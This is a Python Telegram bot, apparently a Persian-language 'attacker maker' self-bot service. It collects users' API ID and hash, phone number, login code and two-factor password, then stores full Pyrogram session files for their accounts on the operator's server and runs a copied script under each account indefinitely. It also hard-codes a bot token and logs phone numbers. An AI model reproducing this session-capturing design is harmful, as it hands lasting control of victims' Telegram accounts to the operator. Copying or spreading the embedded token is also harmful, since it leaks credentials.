import os
import shutil
import asyncio
import sys
import json
from pyrogram import Client, errors
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ==================== پیکربندی ====================
BASE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
SOURCE_RUN_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "run.py")
USERS_FILE = os.path.join(BASE_PATH, "users.json")
GLOBAL_ADMINS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "admins.txt")
USED_ONCE_FILE = os.path.join(BASE_PATH, "used_once.json")  # کاربران «یکبار استفاده» شده

BOT_TOKEN = "7725352062:AAG04KwWE5_we_1qI7Zso7dWhIo1udmGjIU"              # <-- توکن ربات
CHANNEL_USERNAME = "atakersaz"     # <-- بدون @
GROUP_USERNAME   = "atakersazgp"       # <-- بدون @
OWNER_ID = 7619802938

# ==================== دیتای درون‌حافظه ====================
user_data = {}          # وضعیت قدم‌های ستاپ برای هر کاربر
def ensure_base():
    os.makedirs(BASE_PATH, exist_ok=True)
ensure_base()

def load_json(path, default):
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            try:
                return json.load(f)
            except:
                return default
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

all_users = load_json(USERS_FILE, {})
used_once = set(load_json(USED_ONCE_FILE, []))  # کاربرانی که یکبار استفاده کرده‌اند

def save_used_once():
    save_json(USED_ONCE_FILE, list(used_once))

# ==================== کمک‌ها ====================
def fa_to_en_numbers(text):
    return text.translate(str.maketrans("۰۱۲۳۴۵۶۷۸۹", "0123456789"))

def main_menu_keyboard(for_user_id: int) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton("🚀 اجرای ربات", callback_data="run_bot")],
        [InlineKeyboardButton("📢 چنل ما", url=f"https://t.me/{CHANNEL_USERNAME}")],
        [InlineKeyboardButton("👥 گروه ما", url=f"https://t.me/{GROUP_USERNAME}")],
        [InlineKeyboardButton("❓ راهنما", callback_data="help_menu")]
    ]
    if for_user_id == OWNER_ID:
        # «تعلیق» به درخواست شما به معنی «اجازه مجددِ یک‌بار استفاده» پیاده‌سازی شده
        rows.append([InlineKeyboardButton("⚠️ تعلیق (اجازه مجدد)", callback_data="owner_reset")])
    return InlineKeyboardMarkup(rows)

async def show_main_menu_edit(query, user_id: int, text: str = "سلام! خوش اومدی 👋\nیکی از گزینه‌ها رو انتخاب کن:"):
    await query.edit_message_text(text, reply_markup=main_menu_keyboard(user_id))

# ==================== راهنما (فقط edit پیام، پیام جدید ندیم) ====================
HELP_TEXT = "بخش راهنما 📘\nیکی از گزینه‌های زیر را انتخاب کن:"

HELP_STEPS = (
    "🧭 راهنمای مراحل ستاپ:\n"
    "1) «🚀 اجرای ربات» → تایید «✅ بله»\n"
    "2) عضو «چنل» و «گروه» شو و «✅ تایید عضویت» را بزن.\n"
    "3) API ID را وارد کن (عدد)\n"
    "4) API Hash را وارد کن (رشته حروفی)\n"
    "5) شماره با فرمت بین‌المللی: مثل +98912xxxxxxx\n"
    "6) کد تایید که تلگرام می‌فرسته را وارد کن\n"
    "7) اگر رمز دو مرحله‌ای داری، وارد کن\n"
    "پس از موفقیت، ربات شما ساخته و اجرا می‌شود. 🎉"
)

HELP_API = (
    "🔑 گرفتن API ID و API Hash:\n"
    "روش پیشنهادی (my.telegram.org):\n"
    "• وارد وبسایت my.telegram.org شو و با شماره‌ات لاگین کن.\n"
    "• روی API Development Tools بزن.\n"
    "• یک اپ بساز (نام دلخواه). سپس API ID و API Hash بهت می‌ده.\n\n"
    "روش‌های جایگزین (نکات):\n"
    "• حتماً از مرورگر امن استفاده کن.\n"
    "• API ID یک عدد است، API Hash رشته‌ی طولانی حروف/اعداد.\n"
    "• آن‌ها را محرمانه نگه دار."
)

HELP_ERRORS = (
    "🚑 خطاهای رایج و راه‌حل‌ها:\n"
    "• PhoneCodeInvalid: کد تایید اشتباه است → دوباره دقیق وارد کن.\n"
    "• PhoneCodeExpired: کد منقضی شده → کد جدید بگیر.\n"
    "• SessionPasswordNeeded: روی اکانت 2FA فعاله → رمز دوم را وارد کن.\n"
    "• FloodWait Xs: زیاد درخواست دادی → چند دقیقه صبر کن.\n"
    "• ApiIdInvalid/ApiHashInvalid: مقدار API اشتباه → از my.telegram.org دوباره بردار.\n"
    "• PeerFlood/Spam: با احتیاط و فاصله زمانی مناسب اقدام کن.\n"
    "• اتصال قطع شد: اینترنت یا پراکسی را بررسی کن."
)

def help_menu_keyboard(level: str = "root") -> InlineKeyboardMarkup:
    if level == "root":
        rows = [
            [InlineKeyboardButton("🧭 راهنمای مراحل", callback_data="help_steps")],
            [InlineKeyboardButton("🔑 گرفتن API ID/Hash", callback_data="help_api")],
            [InlineKeyboardButton("🚑 خطاهای رایج", callback_data="help_errors")],
            [InlineKeyboardButton("🎧 پشتیبانی", url="https://t.me/cxynnt")],
            [InlineKeyboardButton("⬅️ بازگشت", callback_data="back_to_main")],
        ]
    else:
        rows = [
            [InlineKeyboardButton("⬅️ بازگشت به راهنما", callback_data="help_menu")],
            [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back_to_main")],
        ]
    return InlineKeyboardMarkup(rows)

# ==================== /start ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # سیستم «یکبار استفاده»
    if user_id in used_once:
        await update.message.reply_text("⛔️ شما قبلاً یک‌بار از ربات استفاده کرده‌اید.")
        # حتی اگر استفاده کرده، منو را هم نشان می‌دهیم اما بدون «اجرای ربات»
        rows = [
            [InlineKeyboardButton("📢 چنل ما", url=f"https://t.me/{CHANNEL_USERNAME}")],
            [InlineKeyboardButton("👥 گروه ما", url=f"https://t.me/{GROUP_USERNAME}")],
            [InlineKeyboardButton("❓ راهنما", callback_data="help_menu")]
        ]
        if user_id == OWNER_ID:
            rows.append([InlineKeyboardButton("⚠️ تعلیق (اجازه مجدد)", callback_data="owner_reset")])
        await update.message.reply_text("منوی دسترسی:", reply_markup=InlineKeyboardMarkup(rows))
        return

    await update.message.reply_text(
        "سلام به اتکر ساز خوش اومدي يکي از گزينه هارو انتخاب کن",
        reply_markup=main_menu_keyboard(user_id)
    )

# ==================== هندلر دکمه‌ها ====================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    # اگر کاربر قبلاً استفاده کرده، جلو اجرای مجدد را بگیر
    if query.data in ("run_bot", "confirm_yes", "check_join") and user_id in used_once and user_id != OWNER_ID:
        await query.edit_message_text("⛔️ شما قبلاً یک‌بار از ربات استفاده کرده‌اید.")
        return

    # ---- شروع اجرا ----
    if query.data == "run_bot":
        kb = [[
            InlineKeyboardButton("✅ بله", callback_data="confirm_yes"),
            InlineKeyboardButton("❌ خیر", callback_data="confirm_no")
        ]]
        await query.edit_message_text("⚠️ آیا مطمئنی می‌خوای ربات اجرا بشه؟", reply_markup=InlineKeyboardMarkup(kb))

    elif query.data == "confirm_no":
        await show_main_menu_edit(query, user_id)

    elif query.data == "confirm_yes":
        kb = [
            [InlineKeyboardButton("📢 عضویت در کانال", url=f"https://t.me/{CHANNEL_USERNAME}")],
            [InlineKeyboardButton("👥 عضویت در گروه", url=f"https://t.me/{GROUP_USERNAME}")],
            [InlineKeyboardButton("✅ تایید عضویت", callback_data="check_join")],
            [InlineKeyboardButton("⬅️ بازگشت", callback_data="back_to_main")],
        ]
        await query.edit_message_text(
            "لطفاً اول در کانال و گروه عضو شو، سپس «✅ تایید عضویت» را بزن:",
            reply_markup=InlineKeyboardMarkup(kb)
        )

    elif query.data == "check_join":
        try:
            ch = await context.bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id)
            gp = await context.bot.get_chat_member(f"@{GROUP_USERNAME}", user_id)
            if ch.status not in ["left", "kicked"] and gp.status not in ["left", "kicked"]:
                # قفل تک‌کاربره
                user_data[str(user_id)] = {"step": "api_id"}
                sent = await query.edit_message_text("✅لطفاً API ID خود را وارد کنید:",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ لغو", callback_data="cancel_setup")]])
                )
                user_data[str(user_id)]["last_bot_msg"] = sent.message_id
            else:
                kb = [
                    [InlineKeyboardButton("📢 عضویت در کانال", url=f"https://t.me/{CHANNEL_USERNAME}")],
                    [InlineKeyboardButton("👥 عضویت در گروه", url=f"https://t.me/{GROUP_USERNAME}")],
                    [InlineKeyboardButton("✅ تایید عضویت", callback_data="check_join")],
                    [InlineKeyboardButton("⬅️ بازگشت", callback_data="back_to_main")],
                ]
                await query.edit_message_text("❌ باید حتماً در کانال و گروه عضو باشی.", reply_markup=InlineKeyboardMarkup(kb))
        except Exception as e:
            await query.edit_message_text(f"خطا در بررسی عضویت: {e}")

    # ---- راهنما ----
    elif query.data == "help_menu":
        await query.edit_message_text(HELP_TEXT, reply_markup=help_menu_keyboard("root"))

    elif query.data == "help_steps":
        await query.edit_message_text(HELP_STEPS, reply_markup=help_menu_keyboard("sub"))

    elif query.data == "help_api":
        await query.edit_message_text(HELP_API, reply_markup=help_menu_keyboard("sub"))

    elif query.data == "help_errors":
        await query.edit_message_text(HELP_ERRORS, reply_markup=help_menu_keyboard("sub"))

    elif query.data == "back_to_main":
        await show_main_menu_edit(query, user_id)

    # ---- لغو ----
    elif query.data == "cancel_setup":
        user_data.pop(str(user_id), None)  # پاک کردن وضعیت کاربر
        await show_main_menu_edit(query, user_id, "❌ عملیات لغو شد. برگشتی به منو:")

    # ---- مالک: اجازه‌ی استفاده مجدد (ریست «یکبار مصرف») ----
    elif query.data == "owner_reset":
        if user_id != OWNER_ID:
            await query.edit_message_text("❌ فقط مالک می‌تواند از این گزینه استفاده کند.")
            return
        # با ویرایش همین پیام، از مالک آیدی را می‌خواهیم
        await query.edit_message_text(
            "آیدی عددی کاربری که می‌خواهی اجازه‌ی استفاده‌ی مجدد بگیرد را بفرست:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ بازگشت", callback_data="back_to_main")]])
        )
        context.user_data["awaiting_owner_reset"] = True
# ==================== پیام‌های متنی ====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # اگر مالک در حال ریست یک کاربر باشه
    if context.user_data.get("awaiting_owner_reset"):
        # ... این قسمت رو بعداً می‌تونی تکمیل کنی برای ریست توسط مالک
        return

    # جلوگیری از استفاده دوباره
    if user_id in used_once:
        await update.message.reply_text("⛔️ شما قبلاً یک‌بار از ربات استفاده کرده‌اید.")
        return

    # تبدیل اعداد فارسی به انگلیسی
    text = fa_to_en_numbers(text)
    data = user_data.get(str(user_id), {})
    if not data:
        await update.message.reply_text("لطفاً با /start دوباره شروع کنید.")
        return

    step = data.get("step")

    async def clean_and_ask(new_text: str, next_step: str = None):
        """پاک کردن پیام‌های قبلی و پرسیدن مقدار بعدی"""
        # پاک کردن پیام کاربر
        try:
            await context.bot.delete_message(chat_id=user_id, message_id=update.message.message_id)
        except:
            pass
        # پاک کردن آخرین پیام ربات
        try:
            if "last_bot_msg" in data:
                await context.bot.delete_message(chat_id=user_id, message_id=data["last_bot_msg"])
        except:
            pass

        # فرستادن پیام جدید
        sent = await update.message.chat.send_message(new_text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ لغو", callback_data="cancel_setup")]])
        )
        data["last_bot_msg"] = sent.message_id
        if next_step:
            data["step"] = next_step

    try:
        if step == "api_id":
            try:
                data["api_id"] = int(text)
            except:
                await update.message.reply_text("❌ لطفاً فقط عدد وارد کن.")
                return
            await clean_and_ask("✅API Hash رو وارد کن:", "api_hash")

        elif step == "api_hash":
            data["api_hash"] = text
            await clean_and_ask("✅حالا شماره تلفن خود را وارد کنید (مثل +98912...):", "phone")

        elif step == "phone":
            data["phone"] = text

            user_folder = os.path.join(BASE_PATH, f"{user_id}_{data['api_id']}")
            os.makedirs(user_folder, exist_ok=True)
            data["user_folder"] = user_folder

            session_file = os.path.join(user_folder, "amir.session")
            data["client"] = Client(session_file, api_id=data["api_id"], api_hash=data["api_hash"], phone_number=data["phone"])
            await data["client"].connect()
            try:
                sent_code = await data["client"].send_code(data["phone"])
                data["phone_code_hash"] = sent_code.phone_code_hash
            except Exception as e:
                await update.message.reply_text(f"خطا در ارسال کد: {e}")
                if str(user_id) in user_data:
                    del user_data[str(user_id)]
                return

            await clean_and_ask("✅ شماره ثبت شد.\nکدی که تلگرام فرستاده رو وارد کن:", "code")
            asyncio.get_event_loop().create_task(timeout_checker(str(user_id), update, 60))

        elif step == "code":
            code = text
            client: Client = data["client"]
            try:
                await client.sign_in(
                    phone_number=data["phone"],
                    phone_code=code,
                    phone_code_hash=data["phone_code_hash"]
                )
            except errors.SessionPasswordNeeded:
                await clean_and_ask("اکانت شما رمز دو مرحله‌ای دارد.\nلطفاً رمز دوم را وارد کنید:", "2fa")
                return
            await finish_setup(str(user_id), update)

        elif step == "2fa":
            password = text
            client: Client = data["client"]
            try:
                await client.check_password(password=password)
                await finish_setup(str(user_id), update)
            except Exception:
                await clean_and_ask("⚠️ Password incorrect. Try again.", "2fa")

    except Exception as e:
        await update.message.reply_text(f"خطا: {e}")
        if str(user_id) in user_data:
            del user_data[str(user_id)]
# ==================== پایان ستاپ و اجرا ====================
async def finish_setup(user_id, update):
    global current_user, all_users
    data = user_data[user_id]
    client: Client = data["client"]
    user_folder = data["user_folder"]

    await client.disconnect()

    session_file = os.path.join(user_folder, "amir.session")
    if not os.path.exists(session_file):
        if os.path.exists(data["client"].name + ".session"):
            shutil.move(data["client"].name + ".session", session_file)

    amir_file = os.path.join(user_folder, "amir.py")
    shutil.copy(SOURCE_RUN_FILE, amir_file)

    admins_file_user = os.path.join(user_folder, "admins.txt")
    with open(admins_file_user, "a", encoding="utf-8") as f:
        f.write(str(user_id) + "\n")
    with open(GLOBAL_ADMINS_FILE, "a", encoding="utf-8") as f:
        f.write(str(user_id) + "\n")

    await update.message.reply_text("✅ ربات با موفقیت ساخته شد. برای پنل، در هر چتی دستور (.panel) را بزن.")

    # ثبت کاربر و «یکبار استفاده»
    all_users[user_id] = {"api_id": data["api_id"], "phone": data["phone"]}
    save_json(USERS_FILE, all_users)
    used_once.add(int(user_id))
    save_used_once()

    current_user = None
    if user_id in user_data:
        del user_data[user_id]

    asyncio.get_event_loop().create_task(run_forever_in_folder(amir_file, user_folder))

# ==================== اجرای amir.py ها ====================
async def run_forever_in_folder(file_path, folder):
    while True:
        try:
            process = await asyncio.create_subprocess_exec(
                sys.executable, file_path, cwd=folder
            )
            await process.wait()
            await asyncio.sleep(1)
        except Exception as e:
            print(f"خطا: {e}")
            await asyncio.sleep(3)

async def run_existing_amirs():
    if not os.path.exists(BASE_PATH):
        return
    for folder_name in os.listdir(BASE_PATH):
        user_folder = os.path.join(BASE_PATH, folder_name)
        amir_file = os.path.join(user_folder, "amir.py")
        if os.path.isfile(amir_file):
            asyncio.get_event_loop().create_task(run_forever_in_folder(amir_file, user_folder))

# ==================== تایم‌اوت ====================
async def timeout_checker(user_id, update, timeout):
    await asyncio.sleep(timeout)
    if user_id in user_data:
        await update.message.reply_text("⏰ زمان پاسخ شما تمام شد.")
        global current_user
        current_user = None
        try:
            await user_data[user_id]["client"].disconnect()
        except:
            pass
        del user_data[user_id]

# ==================== اجرای بات ====================
if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    loop = asyncio.get_event_loop()
    loop.create_task(run_existing_amirs())

    print("bot is running...")
    app.run_polling(drop_pending_updates=True)
